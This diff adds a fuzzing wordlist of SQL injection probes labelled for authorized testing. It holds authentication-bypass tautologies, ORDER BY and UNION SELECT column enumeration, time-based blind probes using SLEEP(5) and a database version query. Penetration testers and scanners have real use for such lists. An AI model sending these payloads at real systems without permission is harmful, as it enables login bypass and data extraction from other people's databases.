@@ -1,0 +1,25 @@
+# Non-destructive SQL injection probes for authorized testing
+'
+''
+"
+`
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR 1=1--
+" OR "1"="1
+admin'--
+admin' #
+1' ORDER BY 1--
+1' ORDER BY 10--
+1 AND 1=1
+1 AND 1=2
+1' AND SLEEP(5)--
+' AND SLEEP(5)--
+1 OR SLEEP(5)
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1' UNION SELECT @@version--
+' OR 'a'='a
+1' AND '1'='1
